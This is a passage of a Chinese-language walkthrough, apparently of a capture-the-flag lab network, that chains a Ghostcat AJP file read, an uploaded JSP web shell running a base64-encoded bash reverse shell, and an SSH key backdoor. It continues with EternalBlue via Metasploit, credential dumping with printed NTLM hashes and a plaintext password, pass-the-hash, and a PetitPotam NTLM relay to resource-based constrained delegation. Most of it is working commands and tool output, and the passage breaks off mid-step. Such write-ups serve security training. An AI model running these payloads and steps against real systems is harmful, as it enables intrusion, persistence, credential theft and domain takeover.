&lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>存为字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.107.181:8080 8009  /WEB-INF/web.xml read |grep url-pattern |awk -F &#x27;&gt;&#x27; &#x27;&#123;print $2&#125;&#x27; |awk -F &#x27;&lt;&#x27; &#x27;&#123;print $1&#125;&#x27; &gt;web-xml.dict</span><br></pre></td></tr></table></figure><p>模糊测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w web-xml.dict -u http://39.98.107.181:8080FUZZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://39.98.107.181:8080FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /root/yst/Ghostcat-CNVD-2020-10487-master/web-xml.dict</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">/upload/*               [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 52ms]</span><br><span class="line">/RegisterServlet        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/LoginServlet           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/DownloadServlet        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 54ms]</span><br><span class="line">  /UploadServlet          [Status: 200, Size: 682, Words: 145, Lines: 24, Duration: 58ms]</span><br><span class="line">/HelloServlet           [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 58ms]</span><br><span class="line">:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span><br></pre></td></tr></table></figure><p>测试upload,传🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveHh4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965600238-fb7b31e5-87ef-4de4-b918-129cd9685caa.png"></p><p>返回路径 .&#x2F;upload&#x2F;4332ca5e87df3ffe57f09321848a920a&#x2F;20250326010633582.txt</p><p>vps起个监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080/   8009 /upload/4332ca5e87df3ffe57f09321848a920a/20250326010633582.txt eval</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965895380-498bdd49-6d11-4eff-9243-07ad18693a04.png"></p><p>找一下flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965992071-40a25aee-ac10-4ba1-917e-ada11192fe66.png"></p><p>写公钥留后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.140.174</span><br></pre></td></tr></table></figure><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>上代理，扫描</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742966440528-e934a2f9-feb1-4299-8c1a-b4684ea38ffe.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.11.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.11.76    is alive</span><br><span class="line">(icmp) Target 172.22.11.6     is alive</span><br><span class="line">(icmp) Target 172.22.11.26    is alive</span><br><span class="line">(icmp) Target 172.22.11.45    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">[*] alive ports len is: 13</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理</span><br><span class="line">已完成 13/13</span><br><span class="line">[*] 扫描结束,耗时: 8.210849878s</span><br></pre></td></tr></table></figure><p>分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.11.45 XR-Desktop.xiaorang.lab</span><br><span class="line">172.22.11.6 xiaorang-dc.xiaorang.lab</span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br><span class="line">172.22.11.76  本机</span><br></pre></td></tr></table></figure><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>45扫到ms17-010</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>去admin目录下找到flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742967309061-7ecdeadd-a764-402c-9930-541645380e56.png"></p><p>抓hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username     Domain    NTLM                              SHA1</span><br><span class="line">--------     ------    ----                              ----</span><br><span class="line">XR-DESKTOP$  XIAORANG  37fd17d6c6653c4e65093e33f50f7d3d  e774d3db0995fc0b8469093eb208aa7ece5abb9f</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username     Domain    Password</span><br><span class="line">--------     ------    --------</span><br><span class="line">(null)       (null)    (null)</span><br><span class="line">XR-DESKTOP$  XIAORANG  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4 49 5</span><br><span class="line">                       4 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7 bd 87 dc</span><br><span class="line">                        a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2 db fd 43 ca</span><br><span class="line">                       97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6 52 55 d1 4f 89 0</span><br><span class="line">                       2 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22 b3 83 49 b9 1b b6 79</span><br><span class="line">                        68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76 aa 44 9e c4 e8 85</span><br><span class="line">yangmei      XIAORANG  xrihGHgoNZQ</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username     Domain        Password</span><br><span class="line">--------     ------        --------</span><br><span class="line">(null)       (null)        (null)</span><br><span class="line">xr-desktop$  XIAORANG.LAB  78 3f 3f 97 ea 43 e5 10 7e f8 16 06 4a 55 3d 95 51 a3 5b 02 6a a3 7b 76 c9 b3 34 88 d5 eb 8c 98 74 c1 4e 10 2b 13 b4</span><br><span class="line">                           49 54 ff c2 b1 3d 56 0c ce 6b 40 29 4c 83 d1 3d c9 dd 11 87 68 03 54 9f cc f7 c9 ce 53 1d 34 de 90 13 b9 a7 72 09 b7</span><br><span class="line">                           bd 87 dc a6 cb 5e 77 a7 43 0e fe a1 ac 9b db 91 db 38 92 be e9 d5 cf 1a d2 33 08 e7 94 04 ac 9a 7a 1b df 73 0d ee b2</span><br><span class="line">                           db fd 43 ca 97 ff 6b 2e 1e c0 d4 03 73 56 56 f6 59 7c b7 6b 4e 0d df 54 3f 4f 85 df a8 05 39 22 f3 84 ad 90 d3 a7 b6</span><br><span class="line">                           52 55 d1 4f 89 02 5d 78 91 b1 f2 4b a5 8d aa 73 34 6e d0 17 7c 2d a4 57 21 f3 40 a7 b5 3a 87 a5 c3 fc 99 87 6a 72 22</span><br><span class="line">                           b3 83 49 b9 1b b6 79 68 a5 83 6d 49 5f 71 c2 dd 2d da 19 c9 ff 22 2c ce e3 96 e7 68 0d 42 1c 84 e4 68 8f ce 80 c7 76</span><br><span class="line">                           aa 44 9e c4 e8 85</span><br><span class="line">xr-desktop$  XIAORANG.LAB  (null)</span><br><span class="line">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br></pre></td></tr></table></figure><p>hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:48f6da83eb89a4da8a1cc963b855a799:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>再收集下域内信息，这里多种工具都可以选择，我们选择yangmei这个用户，把他加到管理员组中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 psexec.py Administrator@172.22.11.45 -hashes :48f6da83eb89a4da8a1cc963b855a799 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yangmei /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742969105210-f28ac6b7-4fb4-41ea-abc2-f811a5529fb5.png"></p><p>域内信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u yangmei -p xrihGHgoNZQ -d XIAORANG.LAB --dns-tcp -ns 172.22.11.6 -c all --zip</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970056600-93cfa66d-9515-4626-8d14-e8adeeca44c5.png"></p><p>分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户</span><br><span class="line">2、MAQ = 0，加不了计算机</span><br><span class="line">3、当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制</span><br><span class="line">4、域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL</span><br><span class="line">5、域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName</span><br><span class="line">6、域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam</span><br><span class="line">7、NoPac exploit: Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</span><br></pre></td></tr></table></figure><p>扫描WebClient和petitpotam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav </span><br><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970360182-aeb0962c-55ff-4f69-82f4-7eec881a43b2.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970402986-b4bc86d5-ca24-48f3-8d67-7e5e54095e12.png"></p><p>参考：<a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>发现我们可以用Petitpotam强制目标服务器、目标用户使用LM Hash、NTLM Hash对我们的服务器进行认证，然后我们可以将该认证中继至其他目标服务器中以达到横向、提权等的目的，这里只有172.22.11.26有Petitpotam。通过WebDav进行NTLM Relay的好处在于可以不受到协议签名的影响，对本地内部网或受信任的站点自动使用当前用户凭据进行NTLM认证。</p><p>使用无ADCS + Petitpotam + ntlm中继打法，思路是用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，配置到XR-LCM3AE8B.xiaorang.lab的RBCD。</p><p>但这里有个条件，需要我们把服务器端口的流量转发到客户端本地的80，但SSH的反向端口转发监听的时候只会监听127.0.0.1，这里我们让流量 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的80 ,变相使80监听在0.0.0.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.98.107.181  -D SOCKS代理IP:PORT -R \*:79:127.0.0.1:80</span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ssh：使用 SSH 连接远程服务器。</span><br><span class="line"></span><br><span class="line">-i ~/.ssh/id_rsa：指定 SSH 私钥 id_rsa 进行身份认证。</span><br><span class="line"></span><br><span class="line">root@39.99.139.181：以 root 用户身份连接 39.99.139.181 这台远程服务器。</span><br><span class="line"></span><br><span class="line">-D socksip:port：</span><br><span class="line"></span><br><span class="line">-D 选项开启 SOCKS 代理，即在本地 socksip:port 上启动一个动态端口转发代理。</span><br><span class="line">所有经由这个代理的流量都会通过 39.99.139.181 这台服务器转发，类似于 翻墙代理（SOCKS5 代理）。</span><br><span class="line">-R \*:79:127.0.0.1:80：</span><br><span class="line"></span><br><span class="line">-R 选项表示 远程端口转发。</span><br><span class="line">\*: 表示绑定到所有网卡（即允许任意 IP 访问这个端口）。</span><br><span class="line">79:127.0.0.1:80 表示：</span><br><span class="line">远程服务器 (39.99.139.181) 的 79 端口 会转发到 本地（SSH 客户端所在机器）的 127.0.0.1:80 端口。</span><br><span class="line">socat：一个强大的网络工具，常用于端口转发和代理。</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80,fork,bind=0.0.0.0：</span><br><span class="line"></span><br><span class="line">TCP-LISTEN:80：监听 本机 80 端口，等待 TCP 连接。</span><br><span class="line">fork：每次有新连接时，自动创建一个子进程处理连接（防止阻塞）。</span><br><span class="line">bind=0.0.0.0：监听 所有 IP（外部和本地） 的请求。</span><br><span class="line">TCP:localhost:79：</span><br><span class="line"></span><br><span class="line">当收到 80 端口的请求，会将流量 转发到 localhost:79 端口。</span><br></pre></td></tr></table></figure><p>可以看到这里流量已经成功转发，curl 172.22.11.76的流量转发到了我们本地kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80</span><br><span class="line">proxychains curl http://172.22.11.76:80</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742972622202-c878d395-6ead-4727-92bf-105cc0fe65c3.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742974674648-ea7a21e3-2de5-4d95-a8e3-3b92746bdc00.png"></p><h2 id="Relay-via-WebDAV-Petitpotam的Coerce-Authentication"><a href="#Relay-via-WebDAV-Petitpotam的Coerce-Authentication" class="headerlink" title="Relay via WebDAV+Petitpotam的Coerce Authentication"></a>Relay via WebDAV+Petitpotam的Coerce Authentication</h2><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line"></span><br><span class="line">然后打petitpotam强制认证</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981422611-9816c06b-a2eb-4459-98d4-5e419eb47cf0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742975249440-dd0c22cd-09df-42dd-b1a6-d29b8d74fab5.png"></p><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>配好后直接用之前172.22.11.45上抓的机器账户XR-DESKTOP$哈希打172.22.11.26的RBCD，拿白银票据</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981924104-f66e75d8-f2f6-435a-813b-7a697be00090.png"></p><p>改个名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :37fd17d6c6653c4e65093e33f50f7d3d  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里</span><br><span class="line">172.22.11.26 